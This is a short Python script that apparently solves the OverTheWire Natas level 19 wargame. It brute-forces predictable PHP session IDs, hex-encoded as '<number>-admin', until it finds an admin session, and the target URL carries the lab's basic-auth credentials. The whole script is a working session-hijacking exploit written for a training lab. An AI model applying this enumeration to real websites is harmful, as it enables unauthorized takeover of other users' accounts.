import requests

target = 'http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org/'
acceptStr = "You are an admin."

for i in range(1,641):
        if i % 10 == 0:
                print 'Checked '+str(i)+' sessions...'
        cookies = dict(PHPSESSID=(str(i)+'-admin').encode('hex'))
        r = requests.get(target, cookies=cookies)
        if r.content.find(acceptStr) != -1:
                print 'Got it! Session='+str(i)
                print r.content
                break
